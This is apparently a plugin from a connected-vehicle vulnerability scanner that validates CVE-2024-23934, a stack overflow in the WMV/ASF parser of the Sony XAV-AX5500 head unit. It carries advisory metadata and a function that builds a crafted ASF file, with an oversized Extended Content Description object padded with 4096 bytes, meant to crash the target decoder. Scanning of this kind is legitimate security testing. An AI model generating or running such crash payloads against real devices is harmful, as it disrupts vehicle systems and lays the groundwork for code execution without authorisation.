#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin
from local_exp_stimulus import build_local_sample_probe, write_temp_sample


VULN = {
    "id": 35,
    "cve": "CVE-2024-23934",
    "year": 2024,
    "domain": "IVI/EVSE/车载SoC",
    "vendor_product": "Sony XAV-AX5500",
    "component": "WMV/ASF parser",
    "type": "栈溢出/RCE",
    "summary": "解析恶意WMV/ASF时栈溢出，需用户打开恶意文件或页面。",
    "source_description": "Sony XAV-AX5500 WMV/ASF Parsing Stack-based Buffer Overflow Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Sony XAV-AX5500 devices. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.\n\nThe specific flaw exists within the parsing of WMV/ASF files. A crafted Extended Content Description Object in a WMV media file can trigger an overflow of a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of the device.\n\n. Was ZDI-CAN-22994.",
    "poc_status": "ZDI/ASRG公告；通常无公开完整PoC",
    "research_value": "多来自Pwn2Own/ASRG披露，适合攻击面枚举与固件安全研究。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23934",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-23934",
        "https://www.zerodayinitiative.com/advisories/ZDI-24-875/",
        "https://www.sony.com/electronics/support/mobile-cd-players-digital-media-players-xav-series/xav-ax5500/software/00274156",
        "https://cveawg.mitre.org/api/cve/CVE-2024-23934"
    ],
    "affected": [
        {
            "vendor": "Sony",
            "product": "XAV-AX5500",
            "versions": [
                {
                    "version": "1.13",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2024-23934",
        "Sony",
        "XAV-AX5500",
        "WMV",
        "ASF",
        "parser",
        "RCE",
        "Parsing",
        "Stack-based",
        "Buffer",
        "Overflow",
        "Remote",
        "Code",
        "Execution",
        "Vulnerability",
        "vulnerability",
        "remote",
        "attackers",
        "execute",
        "arbitrary",
        "code",
        "installations",
        "devices",
        "User",
        "interaction",
        "required",
        "exploit"
    ]
}


def _write_malicious_asf_sample() -> str:
    payload = (
        bytes.fromhex("3026b2758e66cf11a6d900aa0062ce6c")
        + (0x2000).to_bytes(8, "little")
        + (2).to_bytes(4, "little")
        + (1).to_bytes(2, "little")
        + (2).to_bytes(2, "little")
        + bytes.fromhex("40a4d0d207e3d21197f000a0c95ea850")
        + (0x1800).to_bytes(8, "little")
        + (0x1000).to_bytes(2, "little")
        + b"A" * 4096
    )
    return write_temp_sample("autosec_cve_2024_23934_", ".asf", payload)


def _asf_probe(plugin, vuln):
    return build_local_sample_probe(
        plugin,
        sample_param="media_sample_path",
        command_params=("wmv_decoder_cmd", "decoder_cmd", "media_player_cmd"),
        generated_sample=_write_malicious_asf_sample,
        phenomenon="crafted ASF/WMV sample prepared for Sony XAV-AX5500 extended-content stack overflow observation",
        operator_action="Run sample_path with the target decoder/player via wmv_decoder_cmd/decoder_cmd/media_player_cmd and observe crash, ASAN, or process restart.",
    )


class Poc29CVE202423934StackOverflowRCEAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-035'
    meta_poc_name = 'CVE-2024-23934 栈溢出/RCE Active Validation'
    meta_cve_id = 'CVE-2024-23934'
    meta_severity = 'High'
    meta_protocol = 'local'
    meta_target_os = ['all']
    meta_required_params = ['software_inventory_text']
    meta_profiles = ['local_artifact', 'network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2024-23934'
    meta_attack_surface = '媒体文件/本地解码器'
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_asf_probe)
